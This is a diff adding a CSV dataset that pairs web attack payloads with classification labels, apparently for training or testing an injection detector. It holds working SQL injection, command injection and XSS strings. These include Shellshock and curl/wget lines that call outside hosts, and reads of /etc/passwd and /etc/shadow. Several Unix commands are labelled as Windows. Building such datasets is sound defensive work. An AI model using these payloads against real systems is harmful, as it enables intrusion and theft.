@@ -1,0 +1,56 @@
+Payload,Classification
+1' ORDER BY 1--+,SQLI
+AS INJECTX WHERE 1=1 AND 1=0--,SQLI
+)) or pg_sleep(5)--,SQLI
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,SQLI
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+",SQLI
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",SQLI
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",SQLI
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",SQLI
+a;id|,Command Injection Windows
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",Command injection UNIX
+%0Acat%20/etc/passwd,Command injection UNIX
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",Command injection UNIX
+a);/usr/bin/id;,Command injection UNIX
+a;id;,Command Injection Windows
+a;id\n,Command Injection Windows
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,Command Injection Windows
+| curl http://crowdshield.com/.testing/rce.txt,Command Injection Windows
+& curl http://crowdshield.com/.testing/rce.txt,Command Injection Windows
+; curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection Windows
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection Windows
+whoami,Command Injection Windows
+| whoami,Command Injection Windows
+; whoami,Command Injection Windows
+&& type %SYSTEMROOT%\repair\SYSTEM,Command Injection Windows
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",Command Injection Windows
+"test* & perl -e 'print ""X""x16096'",Command Injection Windows
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection Windows
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",Command Injection Windows
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",Command Injection Windows
+:phpversion();,Command Injection Windows
+`ping 127.0.0.1`,Command Injection Windows
+\nid\n,Command Injection Windows
+\n/usr/bin/id\n,Command Injection Windows
+"perl -e 'print ""X""x1024'",Command Injection Windows
+"|| perl -e 'print ""X""x16096'",Command Injection Windows
+&& ls -l /var/www/*,Command Injection Windows
+&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;,XSS
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,XSS
+">""><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>",XSS
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,XSS
+"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",XSS
+<embed code=javascript:javascript:alert(1);></embed>,XSS
+"""`'><script>\x7Ejavascript:alert(1)</script>",XSS
+"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",XSS
+"""><img src=x onerror=javascript:alert(`A`)>",XSS
+<script>javascript:alert(1)<\x00/script>,XSS
+"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",XSS
+"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",XSS
+"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",XSS
+"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",XSS
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,XSS
+"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",XSS
+"<IMG SRC=x onloadeddata=""alert(String.fromCharCode(88,83,83))"">",XSS
+"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",XSS
